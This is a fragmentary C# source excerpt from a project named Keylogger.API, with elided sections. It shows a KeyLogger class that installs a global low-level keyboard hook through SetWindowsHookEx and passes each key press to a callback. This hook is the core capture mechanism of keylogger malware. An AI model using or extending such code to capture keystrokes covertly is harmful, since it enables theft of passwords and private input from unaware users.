using Keylogger.API.CallbackObjects;
using Keylogger.API.Helpers;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Keylogger.API
{
    ...
    public class KeyLogger : IDisposable
    {
        ...
        public void CreateKeyboardHook(Action<KeyPressed> keyPressedCallback)
        {
            ...
            globalKeyboardHookId = User32.SetWindowsHookEx(WH_KEYBOARD_LL, this.HookKeyboardDelegate, this.currentModuleId, 0);
        }
